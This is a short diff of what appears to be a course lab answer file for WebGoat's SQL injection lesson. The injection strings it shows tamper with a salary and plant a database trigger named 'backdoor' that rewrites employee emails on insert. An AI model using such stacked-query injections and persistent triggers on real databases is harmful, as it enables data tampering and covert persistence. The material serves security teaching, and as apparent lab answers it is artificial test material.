@@ -1,3 +1,2 @@
 101; update employee set salary = 999 where userid = 101 --
-101; create trigger backdoor before insert on employee for each row begin update employee set email='ece568_24s@utoronto.ca' where userid=new.userid
-## Note: on the WebGoat we use ece568_22s@utoronto.ca to pass the lesson
+101; create trigger backdoor before insert on employee for each row begin update employee set email='ece568_24s@utoronto.ca' where userid=new.userid ## Note: on the WebGoat we use ece568_22s@utoronto.ca to pass the lesson
